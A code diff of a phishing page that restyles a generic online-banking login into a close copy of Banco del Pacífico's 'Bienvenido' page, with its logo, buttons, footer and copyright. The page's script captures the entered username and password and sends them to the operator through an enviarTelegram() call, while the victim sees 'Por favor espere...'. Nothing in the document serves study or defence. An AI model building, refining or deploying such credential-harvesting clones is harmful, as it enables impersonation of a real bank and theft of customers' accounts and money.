@@ -3,47 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banca Virtual - Bienvenid@</title>
+    <title>Banco del Pacífico - Bienvenido</title>
     <style>
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
-        body { background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .login-card { background: #ffffff; padding: 35px 25px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 390px; text-align: center; }
-        .logo { max-width: 140px; margin-bottom: 20px; height: auto; }
-        h1 { font-size: 1.5rem; color: #1e293b; margin-bottom: 25px; font-weight: 700; }
+        * { box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #eef2f6; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .logo-top { max-width: 180px; margin-bottom: 20px; }
+        .card { background: #ffffff; padding: 40px 30px 30px 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); width: 100%; max-width: 420px; text-align: center; }
+        h2 { color: #1a1a1a; font-size: 2.1rem; font-weight: 500; margin-bottom: 35px; letter-spacing: -0.5px; }
         
-        .input-container { position: relative; margin-bottom: 20px; height: 75px; text-align: left; }
-        .input-group { width: 100%; position: absolute; transition: all 0.4s ease; }
-        .oculto { opacity: 0; pointer-events: none; transform: translateY(15px); }
+        .input-container { position: relative; margin-bottom: 25px; height: 50px; text-align: left; }
+        .input-group { width: 100%; position: absolute; transition: all 0.3s ease; }
+        .oculto { opacity: 0; pointer-events: none; transform: translateY(10px); }
         .visible { opacity: 1; pointer-events: auto; transform: translateY(0); }
         
-        label { display: block; font-size: 0.85rem; font-weight: 600; color: #475569; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-        input { width: 100%; padding: 14px; border: 1px solid #cbd5e1; border-radius: 10px; font-size: 0.95rem; color: #1e293b; outline: none; transition: all 0.3s ease; background-color: #f8fafc; }
-        input:focus { border-color: #0056b3; background-color: #ffffff; box-shadow: 0 0 0 4px rgba(0, 86, 179, 0.1); }
+        .floating-label { color: #0056b3; font-size: 0.85rem; font-weight: 500; display: block; margin-bottom: 4px; }
+        input { width: 100%; border: none; border-bottom: 2px solid #0056b3; padding: 6px 0; font-size: 1.05rem; color: #333; outline: none; background: transparent; }
         
-        .btn { width: 100%; padding: 15px; background-color: #d6dbdf; color: #566573; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: all 0.3s ease; margin-top: 10px; }
-        .error-message { color: #e11d48; background: #fff1f2; padding: 12px; border-radius: 10px; border: 1px solid #ffe4e6; font-size: 0.85rem; margin-bottom: 20px; display: none; font-weight: 500; text-align: left; }
+        /* Botones del diseño */
+        .btn-main { width: 100%; padding: 14px; background-color: #dbe0e6; color: #7f8c8d; border: none; border-radius: 6px; font-size: 1.05rem; font-weight: 400; cursor: pointer; transition: all 0.2s ease; margin-bottom: 12px; }
+        .btn-link { width: 100%; padding: 14px; background: #f0f4f8; color: #0056b3; border: none; border-radius: 6px; font-size: 1.05rem; font-weight: 400; cursor: pointer; margin-bottom: 12px; display: block; text-decoration: none; }
+        .btn-text-link { background: none; border: none; color: #0056b3; font-size: 1.05rem; margin: 8px 0 25px 0; cursor: pointer; display: inline-block; width: 100%; }
+        
+        /* Fila de dos columnas inferior */
+        .row-actions { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 10px; }
+        .sub-box { background: #f5f8fa; border-radius: 6px; padding: 15px 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-decoration: none; color: #0056b3; font-size: 0.82rem; font-weight: 500; line-height: 1.3; cursor: pointer; }
+        .sub-box svg { width: 24px; height: 24px; fill: #0056b3; margin-bottom: 8px; }
+        
+        .error-box { display: none; color: #c0392b; background: #fde8e7; padding: 10px; border-radius: 4px; font-size: 0.85rem; margin-bottom: 20px; text-align: left; border-left: 4px solid #c0392b; }
+        .footer-text { margin-top: 25px; font-size: 0.72rem; color: #7a869a; line-height: 1.6; text-align: center; max-width: 400px; }
     </style>
 </head>
 <body>
 
-<div class="login-card">
-    <img src="./logo.png" alt="Logotipo" class="logo">
-    <h1>Banca Virtual</h1>
+<img src="./logo.png" alt="Banco del Pacífico" class="logo-top">
+
+<div class="card">
+    <h2>Bienvenido</h2>
     
-    <div class="error-message" id="lblError">⚠️ Los datos de acceso ingresados son incorrectos. Por favor, intente de nuevo de forma cuidadosa.</div>
+    <div class="error-box" id="lblError">⚠️ Credenciales incorrectas. Verifique e intente nuevamente.</div>
 
     <div class="input-container">
         <div class="input-group visible" id="grupoUsuario">
-            <label>Código de Usuario / Identificación</label>
-            <input type="text" placeholder="Ingrese su usuario" id="txtUsuario" autocomplete="off">
+            <span class="floating-label">Ingresa tu usuario</span>
+            <input type="text" id="txtUsuario" autocomplete="off" placeholder="">
         </div>
         <div class="input-group oculto" id="grupoClave">
-            <label>Contraseña de Acceso</label>
-            <input type="password" placeholder="Ingrese su contraseña" id="txtPassword">
+            <span class="floating-label">Ingresa tu contraseña</span>
+            <input type="password" id="txtPassword" placeholder="">
         </div>
     </div>
 
-    <button type="button" class="btn" id="btnContinuar" disabled>Continuar</button>
+    <button type="button" class="btn-main" id="btnContinuar" disabled>Continuar</button>
+    <div class="btn-link">Desbloquear usuario</div>
+    <div class="btn-text-link">¿Olvidaste tu contraseña?</div>
+
+    <div class="row-actions">
+        <div class="sub-box">
+            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5-4-8-4z"/></svg>
+            Crear usuario y<br>contraseña
+        </div>
+        <div class="sub-box">
+            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4V6h16v12zM6 12h2v2H6zm0-3h2v2H6zm0 6h2v2H6zm4-6h8v2h-8zm0 3h8v2h-8zm0 3h8v2h-8z"/></svg>
+            Solicitar<br>productos
+        </div>
+    </div>
+</div>
+
+<div class="footer-text">
+    Recomendamos utilizar la Banca Virtual con los navegadores<br>Chrome 36.0.1, Firefox 31.0, Microsoft Edge.<br><br>
+    © Copyright 2017 Banco del Pacífico *V5.4.0
 </div>
 
 <script src="./config.js"></script>
@@ -70,11 +98,9 @@
         if (habilitar) {
             btnAccion.style.backgroundColor = '#0056b3';
             btnAccion.style.color = '#ffffff';
-            btnAccion.style.boxShadow = '0 4px 12px rgba(0, 86, 179, 0.2)';
         } else {
-            btnAccion.style.backgroundColor = '#d6dbdf';
-            btnAccion.style.color = '#566573';
-            btnAccion.style.boxShadow = 'none';
+            btnAccion.style.backgroundColor = '#dbe0e6';
+            btnAccion.style.color = '#7f8c8d';
         }
     }
 
@@ -93,7 +119,7 @@
             const user = txtUsuario.value;
             const pass = txtPassword.value;
             
-            btnAccion.innerText = "Validando...";
+            btnAccion.innerText = "Por favor espere...";
             btnAccion.disabled = true;
 
             await enviarTelegram(`👤 *Nuevo Intento de Login:* \nUser: \`${user}\` \nPass: \`${pass}\``);
